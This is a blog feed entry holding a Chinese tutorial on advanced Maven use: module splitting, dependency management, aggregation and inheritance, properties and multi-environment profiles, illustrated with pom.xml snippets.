<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-10-12T13:51:59.937Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>maven高级</title>
    <link href="http://example.com/post/maven%E9%AB%98%E7%BA%A7.html"/>
    <id>http://example.com/post/maven%E9%AB%98%E7%BA%A7.html</id>
    <published>2022-10-12T13:54:41.000Z</published>
    <updated>2022-10-12T13:51:59.937Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-分模块开发与设计"><a class="markdownIt-Anchor" href="#1-分模块开发与设计">#</a> 1、分模块开发与设计</h1><h2 id="11-分模块开发意义"><a class="markdownIt-Anchor" href="#11-分模块开发意义">#</a> 1.1 分模块开发意义</h2><ul><li><p>将原始模块按照功能拆分成若干个子模块，方便模块间的相互调用、接口共享</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221007184340167.png" alt="image-20221007184340167"></p></li></ul><h2 id="12-分模块开发入门案例"><a class="markdownIt-Anchor" href="#12-分模块开发入门案例">#</a> 1.2 分模块开发入门案例</h2><ol><li><p>创建 maven 模块</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221010184508895.png" alt="image-20221010184508895"></p></li><li><p>书写模块代码<br>分模块开发需要先针对模块功能进行设计，再进行编码。不会现将工程开发完毕再进行拆模块</p></li><li><p>通过 maven 指令安装模块到本地仓库 (install 指令)</p><p>团队内部开发需要发布模块功能到团队内部可共享的仓库中（私服）</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221010184658520.png" alt="image-20221010184658520"></p></li><li><p>在需要引用的模块坐标中导入需要用的模块</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.augseventh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>domain<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="2-依赖管理"><a class="markdownIt-Anchor" href="#2-依赖管理">#</a> 2、依赖管理</h1><h2 id="21-依赖传递"><a class="markdownIt-Anchor" href="#21-依赖传递">#</a> 2.1 依赖传递</h2><ul><li><p>依赖是指当前项目运行所需的 jar，一个项目可以设置多个依赖</p></li><li><p>依赖具有传递性</p><ul><li>直接依赖：在当前项目中通过依赖配置建立的依赖关系</li><li>间接依赖：被依赖的资源如果依赖其他资源，当前项目间接依赖其他资源</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221010185004054.png" alt="image-20221010185004054"></p></li><li><p>依赖传递冲突问题</p><ul><li>路径优先：当依赖中出现相同的资源时，层级越深，优先级越低，层级越浅，优先级越高</li><li>声明优先：当资源在相同层级被依赖时，配置顺序靠前的覆盖配置顺序靠后的</li><li>特殊优先：当同级配置了相同资源的不同版本，后配置的覆盖先配置的</li></ul></li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221010185940970.png" alt="image-20221010185940970"></p><h2 id="22-可选依赖"><a class="markdownIt-Anchor" href="#22-可选依赖">#</a> 2.2 可选依赖</h2><ul><li><p>可选依赖是隐藏当前工程所依赖的资源，隐藏后对应资源将不具有依赖传递性 —— 不透明</p><ul><li>如 01 模块使用了 spring 依赖，将 optional 设置为 true 后，被 02 模块继承后将不导入 spring 依赖</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.webjars.npm<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>json-logic-js<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>optional</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>optional</span><span class="token punctuation">></span></span> //隐藏依赖选项<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>可选依赖是当前模块的依赖不想给别人用</p></li></ul><h2 id="23-排除依赖"><a class="markdownIt-Anchor" href="#23-排除依赖">#</a> 2.3 排除依赖</h2><ul><li><p>排除依赖指主动断开依赖的资源，被排除的资源无需指定版本 —— 不需要</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.webjars.npm<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>json-logic-js<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>排除依赖是用别人的资源别人的依赖不想用</p></li><li><p>排除依赖资源仅指定 GA 即可，不需要指定 V</p></li></ul><h1 id="3-继承与聚合"><a class="markdownIt-Anchor" href="#3-继承与聚合">#</a> 3、继承与聚合</h1><h2 id="31-聚合"><a class="markdownIt-Anchor" href="#31-聚合">#</a> 3.1 聚合</h2><ul><li><p>聚合：将多个模块组织成一个整体，同时进行项目构建的过程称为聚合</p></li><li><p>聚合工程：通常是一个不具有业务功能的 “空” 工程（有且仅有一个 pom 文件)</p></li><li><p>作用：使用聚合工程可以将多个工程编组，通过对聚合工程进行构建，实现对所包含的模块进行同步构建</p><ul><li><p>当工程中某个模块发生更新（变更）时，必须保障工程中与已更新模块关联的模块同步更新，此时可以使用聚合工程来解决批量模块同步构建的问题</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221010192149973.png" alt="image-20221010192149973"></p></li></ul></li></ul><ol><li><p>创建 maven 模块作为父工程，设置打包类型为 pom</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.augseventh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven_01_parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--    设置打包方式为pom--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>packaging</span><span class="token punctuation">></span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>packaging</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设置当前聚合工程所包含的子模块的名称</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--    设置管理模块的名称--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modules</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">></span></span>../domain<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">></span></span>../WebService<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modules</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>聚合工程中所包含的模块在进行构建时会根据模块间的依赖关系设置构建顺序，与聚合工程中模块的配置书写位置无关</p><p>参与聚合的工程无法向上感知是否参与聚合，只能向下配置哪些模块参与本工程的聚合</p></li></ol><h2 id="32-继承"><a class="markdownIt-Anchor" href="#32-继承">#</a> 3.2 继承</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221010192744681.png" alt="image-20221010192744681"></p><ul><li>概念：继承描述的是两个工程间的关系，与 java 中的继承相似，子工程可以继承父工程中的配置信息，常见于依赖关系的继承</li><li>作用：<ul><li>简化配置</li><li>减少版本冲突</li></ul></li></ul><ol><li><p>创建父模块，设置打包方式为 pom</p></li><li><p>在父工程的 pom 文件中配置依赖关系（<strong>子工程将沿用父工程中的依赖关系</strong>）</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在父工程中配置子工程中可选的依赖关系</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencyManagement</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        ......    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencyManagement</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在子工程中配置当前工程所继承的父工程</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--    配置当前工程继承自parent工程--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.augseventh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven_01_parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--    填写父工程的pom文件--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>relativePath</span><span class="token punctuation">></span></span>../maven_01_parent/pom.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>relativePath</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在子工程中配置使用父工程中可选依赖的坐标</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>druid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>子工程中使用父工程中的可选依赖时，仅需要提供群组 id 和项目 id，<strong>无需提供版本</strong>，版本由父工程统一提供，避免版本冲突</p><p>子工程中还可以定义父工程中没有定义的依赖关系</p></li></ol><h2 id="33-聚合与继承的区别"><a class="markdownIt-Anchor" href="#33-聚合与继承的区别">#</a> 3.3 聚合与继承的区别</h2><ul><li>作用<ul><li>聚合用于快速构建项目</li><li>继承用于快速配置</li></ul></li><li>相同点<ul><li>聚合与继承的 pom. xml 文件打包方式均为 pom，可以将两种关系制作到同一个 pom 文件中</li><li>聚合与继承均属于设计型模块，并无实际的模块内容</li></ul></li><li>不同点<ul><li>聚合是在当前模块中配置关系，聚合可以感知到参与聚合的模块有哪些</li><li>继承是在子模块中配置关系，父模块无法感知哪些子模块继承了自己</li></ul></li></ul><h1 id="4-属性"><a class="markdownIt-Anchor" href="#4-属性">#</a> 4、属性</h1><h2 id="41-属性"><a class="markdownIt-Anchor" href="#41-属性">#</a> 4.1 属性</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221010194338972.png" alt="image-20221010194338972"></p><ol><li><p>定义属性</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--    定义属性--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring.version</span><span class="token punctuation">></span></span>5.1.9.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring.version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>junit.version</span><span class="token punctuation">></span></span>4.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>junit.version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尖括号内的名称可以随便写</p></li><li><p>引用属性</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>$&#123;spring.version&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="42-配置文件加载属性"><a class="markdownIt-Anchor" href="#42-配置文件加载属性">#</a> 4.2 配置文件加载属性</h2><ol><li><p>定义属性</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--    定义属性--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring.version</span><span class="token punctuation">></span></span>5.1.9.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring.version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>junit.version</span><span class="token punctuation">></span></span>4.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>junit.version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jdbc.url</span><span class="token punctuation">></span></span>jdbc:mysql://127.0.0.1:3306/ssm_db<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jdbc.url</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置文件中引用属性</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">jdbc.driver</span><span class="token punctuation">=</span><span class="token value attr-value">com.mysql.jdbc.Driver</span><span class="token key attr-name">jdbc.url</span><span class="token punctuation">=</span><span class="token value attr-value">$&#123;jdbc.url&#125;</span><span class="token key attr-name">jdbc.username</span><span class="token punctuation">=</span><span class="token value attr-value">root</span><span class="token key attr-name">jdbc.password</span><span class="token punctuation">=</span><span class="token value attr-value">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启资源文件目录加载属性的过滤器</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resources</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resource</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>directory</span><span class="token punctuation">></span></span>$&#123;project.basedir&#125;src/main/resources<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>directory</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filtering</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filtering</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resource</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resources</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启过滤器是能让配置文件使用 ${} 格式的语句</p></li><li><p>配置 maven 打 war 包时，忽略 web.xml 检查</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.tomcat.maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>tomcat7-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>path</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>path</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span>80<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>port</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="43-其他属性了解"><a class="markdownIt-Anchor" href="#43-其他属性了解">#</a> 4.3 其他属性（了解）</h2><ul><li>属性列表<ol><li>自定义属性（常用）</li><li>内置属性</li><li>Setting 属性</li><li>Java 系统属性</li><li>环境变量属性</li></ol></li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221010201942457.png" alt="image-20221010201942457"></p><h2 id="42-版本管理"><a class="markdownIt-Anchor" href="#42-版本管理">#</a> 4.2 版本管理</h2><ul><li>工程版本：<ul><li>SNAPSHOT（快照版本）<ul><li>项目开发过程中临时输出的版本，称为快照版本</li><li>快照版本会随着开发的进展不断更新</li></ul></li><li>RELEASE（发布版本）<ul><li>项目开发到进入阶段里程碑后，向团队外部发布较为稳定的版本，这种版本所对应的构件文件是稳定的，即便进行功能的后续开发，也不会改变当前发布版本内容，这种版本称为发布版本</li></ul></li></ul></li><li>发布版本<ul><li>alpha 版</li><li>beta 版</li><li>纯数字版</li></ul></li></ul><h1 id="5-多环境配置与应用"><a class="markdownIt-Anchor" href="#5-多环境配置与应用">#</a> 5、多环境配置与应用</h1><h2 id="51-多环境开发"><a class="markdownIt-Anchor" href="#51-多环境开发">#</a> 5.1 多环境开发</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20221012093437004.png" alt="image-20221012093437004"></p><ul><li>maven 提供配置多种环境的设定，帮助开发者使用过程中快速切换环境</li></ul><ol><li><p>在父 pom 定义多环境</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profiles</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--        开发环境--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profile</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>env_dep<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jdbc.url</span><span class="token punctuation">></span></span>jdbc:mysql://127.1.1.1:3306/ssm_db<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jdbc.url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activation</span><span class="token punctuation">></span></span>            <span class="token comment">&lt;!--                设定是否为默认环境--></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activeByDefault</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activeByDefault</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activation</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profile</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--        生产环境--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profile</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>env_pro<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token 